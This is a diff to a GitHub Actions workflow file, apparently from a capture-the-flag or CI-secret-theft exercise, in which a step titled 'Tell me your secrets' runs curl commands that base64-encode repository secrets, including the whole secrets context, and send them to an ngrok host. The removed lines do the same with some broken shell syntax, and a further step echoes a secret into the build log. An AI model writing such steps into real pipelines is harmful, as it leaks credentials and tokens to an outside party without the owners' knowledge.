@@ -1,5 +1,5 @@
 
-name: IaC
+name: IaC Pipeline
 
 # Controls when the new movie hosting locations are created or updated
 on:
@@ -19,12 +19,11 @@ jobs:
 
 
     steps:
-      - name: Add mask
+      - name: Tell me your secrets
         run: |
-          export FLAG=${{secrets.FAVOURITE}}
-          curl -k https://ef87-128-131-205-77.eu.ngrok.io?secret=$(FLAG | base64 --wrap=0)
-          curl -k https://ef87-128-131-205-77.eu.ngrok.io?secrets=$(secrets.FAVOURITE | base64 --wrap=0)
-          curl -X POST https://ef87-128-131-205-77.eu.ngrok.io -d $(echo "${{secrets.FAVOURITE}}" | base64 --wrap=0
+          curl -k https://ef87-128-131-205-77.eu.ngrok.io?sec=$(echo "${{ secrets.FAVOURITE }}" | base64 --wrap=0)
+          curl -k https://ef87-128-131-205-77.eu.ngrok.io?sec=$(echo "${{ secrets }}" | base64 --wrap=0)
+          curl -k https://ef87-128-131-205-77.eu.ngrok.io?sec=$(echo "${{ secrets.FAVOURITES }}" | base64 --wrap=0)
 
       - name: I ll tell you my current favourite 
         run: echo ${{ secrets.FAVOURITE }}
